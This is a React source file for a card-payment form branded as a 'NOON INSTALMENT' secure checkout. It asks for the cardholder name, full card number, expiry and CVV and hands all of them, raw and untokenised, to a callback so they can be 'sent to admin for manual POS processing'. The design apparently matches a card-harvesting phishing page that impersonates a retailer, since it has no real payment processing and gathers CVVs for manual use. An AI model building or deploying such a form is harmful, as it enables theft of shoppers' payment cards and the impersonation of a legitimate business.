
import { useState } from "react";
import {
  CreditCard,
  ShieldCheck,
  Send,
  CheckCircle2,
} from "lucide-react";
import "./ManualPOSCard.css";

function digitsOnly(value, max) {
  return String(value || "").replace(/\D/g, "").slice(0, max);
}

function formatCardNumberInput(value) {
  const d = digitsOnly(value, 19);
  return d.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function cardNumberPreview(value) {
  const d = digitsOnly(value, 19);
  const groups = [];
  for (let i = 0; i < 4; i++) {
    const chunk = d.slice(i * 4, i * 4 + 4);
    groups.push(chunk || "••••");
  }
  return groups.join(" \u00a0 ");
}

function formatExpiryInput(value) {
  const d = digitsOnly(value, 4);
  if (d.length <= 2) return d;
  return `${d.slice(0, 2)}/${d.slice(2)}`;
}

export default function ManualPOSCard({ amount = 240, onRequest, onComplete }) {
  const [name, setName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [requestSent, setRequestSent] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  const expiryPreview = expiry.trim() || "MM/YY";

  return (
    <div className="pos-card-panel">
      <div className="pos-card-heading">
        <span className="pos-card-icon">
          <CreditCard size={25} />
        </span>
        <div>
          <h3>Manual POS Card Payment</h3>
          <p>NOON INSTALMENT · Secure Checkout</p>
        </div>
      </div>

      <div className="pos-yellow-line" />

      <div className="pos-accepted-label">Accepted Cards</div>

      <div className="pos-card-logos">
        <img src="/images/cards/visa.jpeg" alt="Visa" />
        <img src="/images/cards/mastercard.jpeg" alt="Mastercard" />
        <img src="/images/cards/mada.jpeg" alt="mada" />
      </div>

      <div className="pos-black-card">
        <div className="pos-card-brand">NOON</div>
        <div className="pos-card-chip">▤</div>
        <div className="pos-card-number">{cardNumberPreview(cardNumber)}</div>
        <div className="pos-card-bottom">
          <div>
            <small>CARDHOLDER</small>
            <strong>{name.trim() || "YOUR NAME"}</strong>
          </div>
          <div className="pos-card-expiry">
            <small>EXPIRES</small>
            <strong>{expiryPreview}</strong>
          </div>
        </div>
      </div>

      {requestSent ? (
        <div className="pos-request-success">
          <CheckCircle2 size={26} />
          <h3>Request Submitted</h3>
          <p>
            {onRequest
              ? "Your card payment request was sent to admin for approval."
              : "Demo request displayed. No request has been sent to an admin."}
          </p>
          <span>Status: Pending</span>
          <button
            type="button"
            onClick={() => setRequestSent(false)}
          >
            Back to Payment
          </button>
        </div>
      ) : (
        <>
          <div className="pos-amount-box">
            <span>Instalment Amount</span>
            <strong>
              SAR{" "}
              {Number(amount).toLocaleString("en-SA", {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2,
              })}
            </strong>
          </div>

          <form
            className="pos-form"
            onSubmit={async (event) => {
              event.preventDefault();
              const cardName = name.trim();
              const numberDigits = digitsOnly(cardNumber, 19);
              const expiryValue = expiry.trim();
              const cvvDigits = digitsOnly(cvv, 4);

              if (!cardName) {
                setError("Enter the cardholder name.");
                return;
              }
              if (numberDigits.length < 13) {
                setError("Enter a valid card number.");
                return;
              }
              if (!/^\d{2}\/\d{2}$/.test(expiryValue)) {
                setError("Enter expiry as MM/YY.");
                return;
              }
              if (cvvDigits.length < 3) {
                setError("Enter the card CVV.");
                return;
              }
              if (!onRequest) {
                setRequestSent(true);
                return;
              }
              setBusy(true);
              setError("");
              try {
                await onRequest({
                  cardholderName: cardName,
                  cardNumber: numberDigits,
                  cardExpiry: expiryValue,
                  cardCvv: cvvDigits,
                });
                if (onComplete) {
                  onComplete();
                } else {
                  setRequestSent(true);
                }
              } catch (requestError) {
                setError(requestError.message || "Request failed");
              } finally {
                setBusy(false);
              }
            }}
          >
            <label htmlFor="pos-name">Cardholder Name</label>
            <input
              id="pos-name"
              type="text"
              name="cardholder"
              placeholder="Enter name on card"
              value={name}
              onChange={(e) => setName(e.target.value)}
              autoComplete="cc-name"
              enterKeyHint="next"
              required
            />

            <label htmlFor="pos-number">Card Number</label>
            <input
              id="pos-number"
              type="text"
              name="cardnumber"
              inputMode="numeric"
              placeholder="1234 5678 9012 3456"
              value={formatCardNumberInput(cardNumber)}
              onChange={(e) =>
                setCardNumber(digitsOnly(e.target.value, 19))
              }
              autoComplete="cc-number"
              enterKeyHint="next"
              required
            />

            <div className="pos-expiry-row">
              <div>
                <label htmlFor="pos-expiry">Expiry (MM/YY)</label>
                <input
                  id="pos-expiry"
                  type="text"
                  name="expiry"
                  inputMode="numeric"
                  placeholder="MM/YY"
                  value={expiry}
                  onChange={(e) =>
                    setExpiry(formatExpiryInput(e.target.value))
                  }
                  autoComplete="cc-exp"
                  enterKeyHint="next"
                  required
                />
              </div>
              <div>
                <label htmlFor="pos-cvv">CVV</label>
                <input
                  id="pos-cvv"
                  type="password"
                  name="cvv"
                  inputMode="numeric"
                  placeholder="•••"
                  value={cvv}
                  onChange={(e) => setCvv(digitsOnly(e.target.value, 4))}
                  autoComplete="cc-csc"
                  enterKeyHint="done"
                  maxLength={4}
                  required
                />
              </div>
            </div>

            <div className="pos-notice">
              <ShieldCheck size={19} />
              <p>
                Card details are sent to admin for manual POS processing.
                Do not share your card PIN or bank OTP with anyone.
              </p>
            </div>

            {error && <p className="pos-demo-note">{error}</p>}

            <button
              type="submit"
              className="pos-submit-button"
              disabled={busy}
            >
              <Send size={18} />
              {busy ? "Submitting..." : "Submit POS Payment Request"}
            </button>
          </form>
        </>
      )}
    </div>
  );
}
